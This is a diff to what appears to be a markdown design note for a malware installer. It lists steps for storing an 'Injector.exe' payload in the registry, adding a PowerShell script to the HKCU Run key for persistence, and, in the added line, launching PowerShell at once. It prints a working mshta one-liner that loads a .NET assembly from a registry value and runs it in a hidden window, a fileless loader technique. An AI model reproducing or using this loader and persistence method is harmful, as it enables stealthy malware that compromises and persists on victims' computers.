@@ -24,6 +24,7 @@ The installer's job:
 
 - Write Injector.exe to the registry
 - Write this **inline** powershell script to HKCU\...\Run for persistence
+- Run powershell.exe for immediate execution
 
 ```
 mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Internet Explorer\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
